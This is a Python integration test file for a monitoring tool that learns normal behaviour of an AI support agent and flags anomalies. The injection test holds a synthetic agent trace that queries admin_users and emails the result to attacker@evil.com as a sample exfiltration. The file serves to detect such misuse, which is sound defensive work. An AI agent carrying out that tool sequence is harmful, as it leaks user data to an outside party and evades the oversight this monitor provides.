"""Integration tests for the full spectra pipeline.

Tests the complete flow: trace -> profile training -> monitor -> detection.
"""

from __future__ import annotations

import random
from datetime import UTC, datetime, timedelta

import pytest

from spectra.models import (
    AgentTrace,
    DetectorType,
    LLMCall,
    Severity,
    ToolCall,
)
from spectra.monitor import Monitor
from spectra.profiler.trainer import ProfileTrainer


def _detection_only_monitor(profile, sensitivity: str = "medium") -> Monitor:
    """Build a monitor that records anomalies without blocking test execution."""
    return Monitor(
        profile=profile,
        sensitivity=sensitivity,
        response_policy={
            "LOW": "log",
            "MEDIUM": "alert",
            "HIGH": "alert",
            "CRITICAL": "alert",
        },
    )


@pytest.mark.integration
class TestFullPipeline:
    """Integration tests exercising the complete detection pipeline."""

    @pytest.mark.asyncio
    async def test_train_and_detect_novel_tool(self) -> None:
        """Train a profile and detect a never-seen tool call."""
        random.seed(42)

        traces = []
        for _ in range(120):
            started = datetime.now(UTC)
            traces.append(
                AgentTrace(
                    agent_type="support-agent",
                    started_at=started,
                    ended_at=started + timedelta(minutes=2),
                    tool_calls=[
                        ToolCall(tool_name="search_kb"),
                        ToolCall(tool_name="respond"),
                    ],
                    llm_calls=[LLMCall(total_tokens=1000)],
                    output="Standard response.",
                )
            )

        trainer = ProfileTrainer(min_traces=100)
        profile = trainer.train(agent_type="support-agent", traces=traces)

        assert profile.is_known_tool("search_kb")
        assert profile.is_known_tool("respond")
        assert not profile.is_known_tool("database_query")

        monitor = _detection_only_monitor(profile, sensitivity="medium")
        monitor.start()

        now = datetime.now(UTC)
        suspicious_trace = AgentTrace(
            agent_type="support-agent",
            started_at=now,
            ended_at=now + timedelta(minutes=2),
            tool_calls=[
                ToolCall(tool_name="search_kb", timestamp=now),
                ToolCall(
                    tool_name="database_query",
                    arguments={"query": "SELECT * FROM users"},
                    timestamp=now + timedelta(seconds=5),
                ),
            ],
            llm_calls=[LLMCall(total_tokens=1000)],
            output="Standard response.",
        )

        events = await monitor.analyze(suspicious_trace)
        assert len(events) > 0

        tool_events = [e for e in events if e.detector_type == DetectorType.TOOL_USAGE]
        assert any(e.severity == Severity.CRITICAL for e in tool_events)

    @pytest.mark.asyncio
    async def test_train_and_detect_volume_anomaly(self) -> None:
        """Train a profile and detect abnormal execution volume."""
        random.seed(42)

        traces = []
        for _ in range(120):
            started = datetime.now(UTC)
            traces.append(
                AgentTrace(
                    agent_type="support-agent",
                    started_at=started,
                    ended_at=started + timedelta(minutes=2),
                    tool_calls=[
                        ToolCall(tool_name="search_kb"),
                        ToolCall(tool_name="respond"),
                    ],
                    llm_calls=[
                        LLMCall(total_tokens=random.randint(800, 1200)),
                        LLMCall(total_tokens=random.randint(800, 1200)),
                    ],
                    output="Normal output.",
                )
            )

        trainer = ProfileTrainer(min_traces=100)
        profile = trainer.train(agent_type="support-agent", traces=traces)

        monitor = _detection_only_monitor(profile, sensitivity="medium")
        monitor.start()

        now = datetime.now(UTC)
        high_volume_trace = AgentTrace(
            agent_type="support-agent",
            started_at=now,
            ended_at=now + timedelta(hours=1),
            tool_calls=[ToolCall(tool_name="search_kb") for _ in range(50)],
            llm_calls=[LLMCall(total_tokens=5000) for _ in range(20)],
            output="Normal output.",
        )

        events = await monitor.analyze(high_volume_trace)
        volume_events = [e for e in events if e.detector_type == DetectorType.VOLUME]
        assert len(volume_events) > 0

    @pytest.mark.asyncio
    async def test_train_and_detect_injection_pattern(self) -> None:
        """Train a profile and detect a prompt injection pattern."""
        random.seed(42)

        traces = []
        for _ in range(120):
            started = datetime.now(UTC)
            traces.append(
                AgentTrace(
                    agent_type="support-agent",
                    started_at=started,
                    ended_at=started + timedelta(minutes=2),
                    tool_calls=[
                        ToolCall(tool_name="search_kb"),
                        ToolCall(tool_name="search_kb"),
                        ToolCall(tool_name="respond"),
                    ],
                    llm_calls=[LLMCall(total_tokens=1000)],
                    output="Standard response.",
                )
            )

        trainer = ProfileTrainer(min_traces=100)
        profile = trainer.train(agent_type="support-agent", traces=traces)

        monitor = _detection_only_monitor(profile, sensitivity="medium")
        monitor.start()

        now = datetime.now(UTC)
        injection_trace = AgentTrace(
            agent_type="support-agent",
            started_at=now,
            ended_at=now + timedelta(minutes=5),
            tool_calls=[
                ToolCall(tool_name="search_kb", timestamp=now),
                ToolCall(tool_name="search_kb", timestamp=now + timedelta(seconds=5)),
                ToolCall(tool_name="respond", timestamp=now + timedelta(seconds=10)),
                ToolCall(
                    tool_name="database_query",
                    arguments={"query": "SELECT * FROM admin_users"},
                    timestamp=now + timedelta(seconds=15),
                ),
                ToolCall(
                    tool_name="send_admin_email",
                    arguments={"to": "attacker@evil.com"},
                    timestamp=now + timedelta(seconds=20),
                ),
            ],
            llm_calls=[LLMCall(total_tokens=1000)],
            output="Standard response.",
        )

        events = await monitor.analyze(injection_trace)
        assert len(events) > 0

        critical_events = [e for e in events if e.severity == Severity.CRITICAL]
        assert len(critical_events) > 0

    @pytest.mark.asyncio
    async def test_multiple_analyses_accumulate_events(self) -> None:
        """Verify that the event log accumulates across multiple analyses."""
        random.seed(42)

        traces = []
        for _ in range(120):
            started = datetime.now(UTC)
            traces.append(
                AgentTrace(
                    agent_type="support-agent",
                    started_at=started,
                    ended_at=started + timedelta(minutes=2),
                    tool_calls=[ToolCall(tool_name="search_kb")],
                    llm_calls=[LLMCall(total_tokens=1000)],
                )
            )

        trainer = ProfileTrainer(min_traces=100)
        profile = trainer.train(agent_type="support-agent", traces=traces)

        monitor = _detection_only_monitor(profile)
        monitor.start()

        for _i in range(3):
            trace = AgentTrace(
                agent_type="support-agent",
                tool_calls=[ToolCall(tool_name="evil_tool")],
            )
            await monitor.analyze(trace)

        assert len(monitor.event_log) >= 3

        summary = monitor.summary()
        assert summary["total_anomalies"] >= 3
